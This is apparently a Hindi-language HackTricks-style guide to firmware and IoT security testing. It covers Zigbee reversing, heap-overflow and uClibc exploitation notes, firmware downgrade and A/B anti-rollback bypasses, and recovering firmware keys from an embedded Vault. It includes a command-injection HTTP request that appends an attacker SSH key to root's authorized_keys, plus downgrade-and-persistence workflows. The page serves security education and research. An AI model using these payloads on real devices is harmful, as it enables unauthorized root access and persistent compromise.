इस चरण में, analysis के लिए या तो वास्तविक या emulated device environment का उपयोग किया जाता है। OS और filesystem तक shell access बनाए रखना आवश्यक है। Emulation hardware interactions की हूबहू नकल नहीं कर सकता, इसलिए कभी-कभी emulation को फिर से शुरू करना पड़ सकता है। Analysis में filesystem की दोबारा जांच करना, उजागर webpages और network services का exploit करना, और bootloader vulnerabilities तलाशना शामिल होना चाहिए। संभावित backdoor vulnerabilities की पहचान के लिए firmware integrity tests बेहद महत्वपूर्ण हैं।

## Runtime Analysis की तकनीकें

Runtime analysis में किसी process या binary के operating environment में उसके साथ interaction करना शामिल है। इसमें breakpoints सेट करने और fuzzing तथा अन्य तकनीकों के ज़रिए vulnerabilities की पहचान करने के लिए gdb-multiarch, Frida और Ghidra जैसे tools का उपयोग किया जाता है।

पूर्ण debugger के बिना embedded targets के लिए, device पर **statically-linked `gdbserver` की copy रखें** और remotely attach करें:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor message mapping

IoT hubs में RF stack अक्सर **radio MCU** और Linux userland process के बीच विभाजित होता है। एक उपयोगी workflow है इस path को map करना:<sup>[[8]](#references)</sup>

1. हवा में **RF frame**
2. radio MCU पर **controller-side parser**
3. Linux को forward किया गया **serial/UART text या TLV protocol** (उदाहरण के लिए `/dev/tty*`)
4. मुख्य daemon में **application dispatcher**
5. **protocol-specific handler / state machine**

इस architecture में एक के बजाय दो reversing targets बनते हैं। अगर controller binary radio frames को `Group,Command,arg1,arg2,...` जैसे textual protocol में बदलता है, तो पता लगाएँ:

- **message groups** और dispatch tables
- कौन-से messages **network** से आ सकते हैं और कौन-से खुद controller से
- सटीक **manufacturer-specific discriminator fields** (उदाहरण के लिए Zigbee `manufacturer_code` और custom `cluster_command`)
- कौन-से handlers केवल **commissioning**, discovery, या firmware/model download phases के दौरान reachable होते हैं

विशेष रूप से Zigbee के लिए, pairing traffic capture करें और जाँचें कि क्या target अभी भी default **Link Key** `ZigBeeAlliance09` पर निर्भर है। अगर ऐसा है, तो commissioning traffic को sniff करने से **Network Key** उजागर हो सकती है। Zigbee 3.0 install codes इस exposure को कम करते हैं, इसलिए ध्यान दें कि जाँचा गया device वास्तव में इन्हें enforce करता है या नहीं।

### Manufacturer-specific protocol handlers और FSM-gated reachability

Vendor-specific Zigbee/ZCL commands अक्सर standardized clusters से बेहतर target होते हैं, क्योंकि वे कम battle-tested validation वाले **custom parsing code** और internal **FSMs** तक पहुँचते हैं।<sup>[[8]](#references)</sup>

व्यावहारिक workflow:

- **vendor-only handler** मिलने तक command dispatcher को reverse करें।
- **FSM state**, **event**, **check**, **action**, और **next-state** tables निकालें।
- ऐसे **transitional states** पहचानें जो auto-advance होते हैं, और retry/error branches पहचानें जो अंततः attacker-controlled state को reset या free करते हैं।
- यह मानने के बजाय कि buggy handler हमेशा reachable है, पुष्टि करें कि daemon को vulnerable state में पहुँचाने के लिए कौन-से वैध protocol exchanges ज़रूरी हैं।

Timing-sensitive protocols के लिए, Python framework से packet replay करना बहुत धीमा हो सकता है। एक अधिक विश्वसनीय तरीका है vendor-grade stack वाले real hardware (उदाहरण के लिए **nRF52840**) पर किसी वैध device का emulation करना, ताकि सही **endpoints**, **attributes**, और commissioning timing उपलब्ध कराई जा सके।

### Embedded daemons में fragmented-download bug class

एक बार-बार दिखने वाली firmware bug class **fragmented blob/model/configuration downloads** में मिलती है:<sup>[[8]](#references)</sup>

1. **पहला fragment** (`offset == 0`) `ctx->total_size` store करता है और `malloc(total_size)` allocate करता है।
2. बाद के fragments केवल attacker-controlled **packet-local** fields validate करते हैं, जैसे `packet_total_size >= offset + chunk_len`।
3. Copy `memcpy(&ctx->buffer[offset], chunk, chunk_len)` का उपयोग करती है, लेकिन **original allocated size** के विरुद्ध जाँच नहीं करती।

इससे attacker यह कर सकता है:

- छोटी heap allocation करवाने के लिए **छोटे** declared total size वाला पहला वैध fragment भेजना।
- बाद में **expected offset**, लेकिन बड़ा `chunk_len` वाला fragment भेजना।
- forged packet-local size देना, जो नई checks को संतुष्ट करे, लेकिन फिर भी मूल allocated buffer को overflow कर दे।

जब vulnerable path commissioning logic के पीछे हो, तो exploitation में malformed fragments भेजने से पहले target को अपेक्षित model-download या blob-download state में लाने के लिए पर्याप्त **device emulation** शामिल होना चाहिए।

### Protocol-driven `free()` triggers

Embedded daemons में heap metadata exploitation trigger करने का सबसे आसान तरीका अक्सर "cleanup का इंतज़ार करना" नहीं, बल्कि **protocol की अपनी error handling को मजबूर करना** होता है:<sup>[[8]](#references)</sup>

- FSM को **retry** या **error** states में धकेलने के लिए malformed follow-up fragments भेजें।
- retry threshold पार करें, ताकि daemon **context reset** करे और corrupted buffer को free करे।
- Process के अन्य कारणों से crash होने से पहले allocator-side primitives trigger करने के लिए इस अनुमानित `free()` का उपयोग करें।

यह embedded Linux में **musl/uClibc/dlmalloc-जैसे** allocators के विरुद्ध विशेष रूप से उपयोगी है, जहाँ chunk metadata को corrupt करने से unlink/unbin logic write primitive में बदल सकता है। एक स्थिर तरीका यह है कि **size field** को corrupt करके allocator traversal को overflowed buffer के अंदर staged **fake chunks** की ओर मोड़ा जाए, बजाय इसके कि real bin pointers को तुरंत overwrite करके process crash कर दिया जाए।

## Binary Exploitation और Proof-of-Concept

पहचानी गई vulnerabilities के लिए PoC विकसित करने हेतु target architecture की गहरी समझ और lower-level languages में programming की ज़रूरत होती है। Embedded systems में binary runtime protections दुर्लभ हैं, लेकिन मौजूद होने पर Return Oriented Programming (ROP) जैसी techniques आवश्यक हो सकती हैं।

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc, glibc की तरह fastbins का उपयोग करता है। बाद में होने वाली बड़ी allocation `__malloc_consolidate()` trigger कर सकती है, इसलिए किसी भी fake chunk को checks (सही size, `fd = 0`, और आसपास के chunks का "in use" दिखना) से बचकर निकलना होगा।<sup>[[6]](#references)</sup>
- **ASLR के तहत non-PIE binaries:** अगर ASLR enabled है, लेकिन main binary **non-PIE** है, तो binary के भीतर `.data/.bss` addresses स्थिर रहते हैं। आप उस region को target कर सकते हैं जो पहले से valid heap chunk header जैसा दिखता हो, ताकि fastbin allocation **function pointer table** पर पहुँचे।
- **Parser-stopping NUL:** JSON parse होने पर payload में मौजूद `\x00` parsing रोक सकता है, जबकि trailing attacker-controlled bytes को stack pivot/ROP chain के लिए बनाए रखता है।
- **`/proc/self/mem` के ज़रिए shellcode:** `open("/proc/self/mem")`, `lseek()`, और `write()` call करने वाली ROP chain executable shellcode को ज्ञात mapping में रखकर उस पर jump कर सकती है।

## Firmware Analysis के लिए तैयार Operating Systems

[AttifyOS](https://github.com/adi0x90/attifyos) और [EmbedOS](https://github.com/scriptingxss/EmbedOS) जैसे operating systems firmware security testing के लिए pre-configured environments उपलब्ध कराते हैं, जिनमें ज़रूरी tools शामिल होते हैं।

## Firmware analysis के लिए तैयार OSs

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS एक distro है, जिसका उद्देश्य Internet of Things (IoT) devices का security assessment और penetration testing करने में आपकी मदद करना है। सभी ज़रूरी tools के साथ pre-configured environment देकर यह आपका काफी समय बचाता है।
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 पर आधारित embedded security testing operating system, जिसमें firmware security testing tools पहले से loaded हैं।

## Firmware Downgrade Attacks और Insecure Update Mechanisms

यहाँ तक कि जब vendor firmware images के लिए cryptographic signature checks लागू करता है, तब भी अक्सर **version rollback (downgrade) protection छोड़ दी जाती है**। जब boot- या recovery-loader केवल embedded public key से signature verify करता है, लेकिन flash किए जा रहे image का *version* (या monotonic counter) नहीं जाँचता, तो attacker वैध रूप से **पुराना, vulnerable firmware—जिस पर valid signature अब भी मौजूद है—install कर सकता है**, और इस तरह patched vulnerabilities फिर से सामने आ सकती हैं।<sup>[[4]](#references)</sup>

सामान्य attack workflow:

1. **पुराना signed image प्राप्त करें**
   * इसे vendor के public download portal, CDN या support site से लें।
   * इसे companion mobile/desktop applications से extract करें (उदाहरण के लिए Android APK के अंदर `assets/firmware/` से)।
   * इसे VirusTotal, Internet archives, forums आदि जैसे third-party repositories से प्राप्त करें।
2. किसी भी exposed update channel के ज़रिए image को device पर **upload या serve करें**:
   * Web UI, mobile-app API, USB, TFTP, MQTT आदि।
   * कई consumer IoT devices *unauthenticated* HTTP(S) endpoints उपलब्ध कराते हैं, जो Base64-encoded firmware blobs स्वीकार करते हैं, उन्हें server-side decode करते हैं और recovery/upgrade शुरू करते हैं।
3. Downgrade के बाद, ऐसी vulnerability exploit करें जिसे नए release में patch किया गया था (उदाहरण के लिए बाद में जोड़ा गया command-injection filter)।
4. Persistence मिल जाने के बाद, detection से बचने के लिए वैकल्पिक रूप से नवीनतम image वापस flash करें या updates disable करें।

### उदाहरण: Downgrade के बाद Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

कमज़ोर (downgraded) firmware में, `md5` parameter को बिना sanitisation के सीधे shell command में जोड़ा जाता है, जिससे मनमाने commands inject किए जा सकते हैं (यहाँ—SSH key-based root access सक्षम करने के लिए)। बाद के firmware versions में एक बुनियादी character filter जोड़ा गया, लेकिन downgrade protection न होने के कारण यह fix बेअसर है।<sup>[[4]](#references)</sup>

### Mobile Apps से Firmware निकालना

कई vendors अपने companion mobile applications में पूरी firmware images शामिल करते हैं, ताकि app Bluetooth/Wi-Fi के ज़रिए device को update कर सके। ये packages आम तौर पर APK/APEX में `assets/fw/` या `res/raw/` जैसे paths पर unencrypted रखे जाते हैं। `apktool`, `ghidra` या यहाँ तक कि साधारण `unzip` जैसे tools, physical hardware को छुए बिना signed images निकालने देते हैं।<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot designs में केवल updater में मौजूद anti-rollback bypass

कुछ vendors anti-downgrade **ratchet** लागू करते हैं, लेकिन केवल *updater* logic में (उदाहरण के लिए, CAN पर UDS routine, recovery command या userspace OTA agent)। अगर **bootloader** बाद में केवल image signature/CRC जाँचता है और partition table या slot metadata पर भरोसा करता है, तो rollback protection को अब भी bypass किया जा सकता है।<sup>[[7]](#references)</sup>

आम कमज़ोर design:

- Firmware metadata में version descriptor और **security ratchet** / monotonic counter, दोनों होते हैं।
- Updater image ratchet की तुलना persistent storage में मौजूद value से करता है और पुराने signed images को अस्वीकार कर देता है।
- Bootloader उस ratchet को **parse नहीं** करता और चुने गए slot से boot करने से पहले केवल header, CRC और signature verify करता है।
- Slot activation को partition table या per-slot generation counter में अलग से store किया जाता है और इसे validated firmware के सटीक digest से **cryptographically bind नहीं** किया जाता।

इससे dual-slot systems में **एक image validate करो / दूसरी image boot करो** primitive बनता है। अगर attacker updater से slot B को current signed image के ज़रिए अगला boot target mark करवा सकता है, और reboot से पहले slot B को overwrite कर सकता है, तो bootloader downgraded image को boot कर सकता है, क्योंकि वह केवल पहले से committed slot metadata पर भरोसा करता है।

आम abuse pattern:

1. Passive slot में **current signed** firmware upload करें और सामान्य validation/switch routine चलाएँ, ताकि layout उस slot को अगला active slot mark करे।
2. **अभी reboot न करें**। उसी session में slot-preparation/erase routine फिर से चलाएँ।
3. पुराने boot-state या slot-selection logic का दुरुपयोग करें, ताकि updater उसी physical slot को erase करे जिसे अभी promote किया गया था।
4. उस slot में **पुराना, लेकिन अब भी signed** firmware लिखें।
5. Ratchet लागू करने वाली validation routine को छोड़कर सीधे reboot करें।
6. Bootloader promoted slot चुनता है, केवल signature/integrity verify करता है और पुरानी image boot करता है।

A/B update implementations को reverse करते समय इन बातों पर ध्यान दें:

- Slot selection ऐसे **boot-time flags** से तय होता है जिन्हें सफल switch के बाद refresh नहीं किया जाता।
- `prepare_passive_slot()` जैसी routine **current committed layout** के बजाय पुराने state के आधार पर slot erase करती है।
- `part_write_layout()` जैसा function केवल **generation counter** / active flag बढ़ाता है और validated image hash store नहीं करता।
- Ratchet checks userspace या updater code में लागू हैं, लेकिन ROM / bootloader / secure boot stages में **नहीं**।
- Erase या recovery routines slot का content हटाकर दोबारा लिखने के बाद भी उसे bootable mark रहने देती हैं।

### Update Logic का आकलन करने के लिए Checklist

* क्या *update endpoint* का transport/authentication पर्याप्त रूप से सुरक्षित है (TLS + authentication)?
* क्या flashing से पहले device **version numbers** या **monotonic anti-rollback counter** की तुलना करता है?
* क्या image को secure boot chain के भीतर verify किया जाता है (जैसे, ROM code द्वारा signatures जाँचना)?
* क्या **bootloader updater के समान ratchet लागू करता है**, या केवल signature/CRC जाँचता है?
* क्या slot activation metadata **validated firmware digest/version से bound** है, या promotion के बाद slot को बदला जा सकता है?
* Slot switch सफल होने के बाद, क्या device को reboot करना अनिवार्य होता है, या उसी session में बाद की update/erase routines अब भी चल सकती हैं?
* क्या userland code अतिरिक्त sanity checks करता है (जैसे, allowed partition map, model number)?
* क्या *partial* या *backup* update flows में भी वही validation logic इस्तेमाल होती है?

> 💡  अगर ऊपर दी गई इनमें से कोई भी चीज़ मौजूद नहीं है, तो platform शायद rollback attacks के प्रति vulnerable है।

## अभ्यास के लिए vulnerable firmware

Firmware में vulnerabilities ढूँढ़ने का अभ्यास करने के लिए, इन vulnerable firmware projects से शुरुआत करें।

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state से firmware decryption keys रिकवर करना

जब कोई update image थोड़े plaintext metadata और बड़े high-entropy blob को मिलाती है, तो brute-forcing से पहले container triage करें:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d` और `binwalk -E` से headers, offsets और line boundaries dump करें।
- `Salted__` आमतौर पर OpenSSL `enc` format का संकेत है: अगले 8 bytes salt होते हैं और बाकी bytes ciphertext।
- अगर कोई Base64 field decode होकर ठीक `256` bytes की हो, तो यह इस बात का मज़बूत संकेत है कि आप RSA-2048 ciphertext देख रहे हैं, जो random firmware password/session key को wrap करता है।
- उसी file में मौजूद detached PGP material अक्सर केवल authenticity को सुरक्षित रखता है; यह न मानें कि वही confidentiality mechanism है।

अगर static key hunting (`grep`, `strings`, PEM/PGP searches) से कुछ न मिले, तो केवल private keys खोजने के बजाय **operational decrypt path** को reverse करें:

- Updater / management binary को decompile करें और पता लगाएँ कि encrypted blob कौन पढ़ता है, उसे unwrap करने के लिए कौन-सा helper/API इस्तेमाल होता है, और वह किस logical key name का अनुरोध करता है।
- Extracted root filesystem में KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), साथ ही unit files और init scripts खोजें।
- Plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens या local KMS auto-unseal scripts को private-key material के बराबर मानें।

अगर appliance में original Vault binary और storage backend मौजूद हों, तो Vault internals को फिर से implement करने के बजाय उस environment को दोबारा चलाना आमतौर पर आसान होता है:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

क्लोन किए गए KMS पर root access के साथ:

- Transit keys को केवल isolated clone के अंदर exportable बनाएं: `vault write transit/keys/<name>/config exportable=true`
- Unwrap key export करें: `vault read transit/export/encryption-key/<name>`
- रिकवर की गई RSA key को KMS में इस्तेमाल किए गए सटीक padding/hash pair के साथ आज़माएं। PKCS#1 v1.5 decrypt का विफल होना और default OAEP decrypt का विफल होना इस बात का प्रमाण **नहीं** है कि key गलत है; Vault-backed flows में अक्सर SHA-256 के साथ OAEP इस्तेमाल होता है, जबकि आम libraries में default SHA-1 होता है।
- अगर payload `Salted__` से शुरू होता है, तो AES-CBC decryption आज़माने से पहले vendor के OpenSSL KDF (`EVP_BytesToKey`, अक्सर legacy appliances में MD5) को हूबहू दोहराएं।

इससे "encrypted firmware" एक अधिक सामान्य समस्या बन जाता है: **appliance-side operational keys रिकवर करें, फिर offline सटीक unwrap + KDF parameters को दोहराएं**।

## Training और Certifications

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude के साथ Firmware Cracking: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: Internet of Things पर हमला करने की definitive guide](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [छोड़े गए hardware में zero days का Exploiting – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [कैसे एक $20 Smart Device ने मुझे आपके घर तक access दिया](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [अब आप mi को देखते हैं: अब आप Pwned हैं](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector को उसके charge port connector से Exploiting करना - Part 2: anti-downgrade को bypass करना](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [इसे Blink कराएं: Philips Hue Bridge का Over-the-Air Exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU पर ROOT Tesla OS Part 1: Unpacking](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux kernel documentation - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU पर ROOT Tesla OS Part 2: Debugging और Fixing](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS Passwords: कमजोर XOR Encryption से SPI Flash से Recovery संभव (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS password recovery tooling](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
